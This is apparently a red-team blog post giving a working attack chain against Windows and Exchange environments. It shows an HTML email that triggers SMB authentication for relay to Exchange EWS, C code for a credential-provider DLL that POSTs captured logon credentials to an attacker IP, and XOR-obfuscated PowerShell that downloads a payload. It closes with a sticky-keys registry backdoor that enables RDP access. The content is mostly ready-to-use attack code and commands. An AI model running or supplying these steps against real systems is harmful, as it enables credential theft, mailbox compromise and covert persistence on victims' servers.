---
layout: single
title: SMB Relaying EWS and Stealthily Backdooring Servers
date: 2020-07-01
classes: wide
tags:
  - Red Team
--- 
![](/assets/images/ews.PNG)

## Create the email.
```html
<html>
<head>
<img src='file://<IP_ADDRESS>/aaa/bbb.jpg'/></img>
</head>
</html>
```
1. Save the contents as whatever.html  
2. Open the html file in Microsoft Word
3. Copy the contents and paste them into the Outlook Email.  

## ZackAttack

  - ```sudo ruby zackattack.rb```  
  - Add connected user to a group  
  - Attack Rules --> Add External Exchange Server IP -> Add IP to Group  
  - On Actions specify groups and launch attack!!!
  - Harvest downloaded user emails for credentials  

## Custom Credential Provider  

### Modify source  
  - Download [Custom Credential Provider](https://github.com/tdubs/credential-provider)
  - Make sure it builds as x64 .dll under VS2015
  - Comment Line 258, 261, 262, 263, 443, 444, 448, 449  
  - Add the following code from 450  

```C
HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); // Update the following IP to match yours! 
HINTERNET hSession = InternetConnect(hInternet, L"<IP ADDRESS>", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
HINTERNET hReq = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0); 
char* pBuf = charVar; 
// Send the request. 
HttpSendRequest(hReq, NULL, 0, pBuf, strlen(pBuf)); 
```

  - Copy .dll and .reg files inside cp.  

### RDP into Target machine

  - Move .reg and .dll files inside the machine
  - Copy the dll into C:\Windows\System32  
  - Execute Register.reg file  

### Log POST Requests with Apache

  - ```apache2ctl -M``` --> dumpio_module used  
  - /etc/apache2/apache2.conf --> Add at the end.  
  ```
  DumpIOInput On
  DumpIOOutput On
  LogLevel dumpio:trace7
  ```  
  - ```tail -f /var/log/apache2/error.log``` --> POST logged here.  

## Persistence 
  1. Download [PowerShdll](https://github.com/p3nt4/PowerShdll)
  
  2. Create a xored powershdll file.  
```powershell
$var1 = (New-Object Net.WebClient).DownloadData("http://<IP>/Powershdll.exe")
for ($i=0;$i -lt $var1.count;$i++)
{
	$var1[$i] = $var1[$i] -bxor 0x99
}
[system.convert]::ToBase64String($var1) | out-file C:\Users\malic\Desktop\x0red_Powershdll.exe
```  
  3. Download and decode the file on the target machine

```powershell
$var1 = (New-Object Net.WebClient).DownloadString("http://<IP>/x0red_Powershdll.exe")
$var1 = [system.convert]::FromBase64String($var1)
for ($i=0; $i -lt $var1.count; $i++)
{
  $var1[$i] = $var1[$i] -bxor 0x99
}
[system.io.file]::WriteAllBytes("$env:TEMP\PowerShdll.exe",$var1)
```  

  4. $env:TEMP\launcher.bat
  ```
  start "" "C:\Users\SomeAdmin\AppData\Local\Temp\Powershdll.exe" -i 
  ```
  5. Modify Registry Key to add a debugger for sticky keys and call PowerShdll.exe 
  6. Enable Multiple RDP Sessions 

```powershell
cmd.exe /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d $env:TEMP\launcher.bat
cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /d 0 /f
```

Resources:  
  - [ZackAttack](https://github.com/urbanesec/ZackAttack)
  - [NtlmRelaytoEWS](https://github.com/Arno0x/NtlmRelayToEWS)
  - [Dirkjam Blog](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
  - [Custom Credential Provider](https://github.com/tdubs/credential-provider)  
  - [PowerShdll](https://github.com/p3nt4/PowerShdll)
